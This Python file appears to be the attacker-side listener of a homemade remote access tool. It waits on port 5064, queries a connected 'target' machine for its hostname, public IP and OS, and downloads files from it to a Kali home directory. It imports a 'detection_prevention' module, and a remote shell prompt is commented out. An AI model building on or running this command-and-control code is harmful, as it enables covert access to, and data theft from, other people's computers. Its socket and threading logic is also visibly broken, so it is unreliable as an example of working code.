## New Server Code

## Order: start socket, bind to address, and listen for connections. Each new
#connection needs to be in its own thread

import subprocess as sp
import socket
import threading
import time


import imports
import linux_info
import detection_prevention


HEADER = 64
FORMAT = 'utf-8'

class s_sock:
    
    def start_server(self, ip, port):
        
        self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.ADDR = (ip,port)
        self.server.bind(self.ADDR)  
        
        self.server.listen()  
        
        ## threading for clients
        while True:
            self.start_server.conn, addr = self.server.accept()
            thread = threading.Thread(target=self.handle_client, args=(self, self.start_server.conn, self.ADDR))
            thread.start()
            return True
        
    
    def handle_client(self, conn, addr):
        print(f"New Connection from {addr}")
        ## connection stuff... all needs to be redone
        
        ## Context manager for socket
        #with self.server as s:
            
        self.connected = True
        while self.connected: 
            try:
                #user_input = input("[SHELL]:")
                #self.send_msg(self, user_input)
                    
                ## Knocks CPU usage on disconnect
                time.sleep(0.001)

            except:
                conn.close()
                print(f"{addr} DISCONNECTED")
                self.connected = False
                return self.connected
            
            if self.connected == False:
                conn.close()
                print(f"{addr} DISCONNECTED")
                self.connected = False
                return self.connected
                
    
    
    def send_msg(self, message):
        self.start_server.conn.send(message.encode())
        recieve_msg = self.start_server.conn.recv(10000).decode()
        
        if recieve_msg == None:
            self.conected = False
        
        #print("HI")  
          ## why are you still encoded
        recieve_msg = str(recieve_msg)
        #print(recieve_msg) 
        return recieve_msg
    
    def file_download(self, file): ## << message is the same as file in this case
        self.start_server.conn.send(file.encode())

        with open("/home/kali/file","wb") as writefile:
            while True:
            
                recieve_msg = self.start_server.conn.recv(10) ##no decode becasue we need the bytes

                if not recieve_msg:## on no more tranfered data, break
                    break

                writefile.write(recieve_msg)



class s_action:
    
    def c_get_hostname():
        #print(linux_info.host.hostname())
        return s_sock.send_msg(s_sock, linux_info.target.hostname())
    
    def c_pub_ip():
        return s_sock.send_msg(s_sock, linux_info.target.pub_ip())
    
    def c_os():
        return s_sock.send_msg(s_sock, linux_info.target.os())


if __name__ == "__main__":
    ## could listen on multiple ports with threading this whole thing
    s_sock.start_server(s_sock,'0.0.0.0',5064)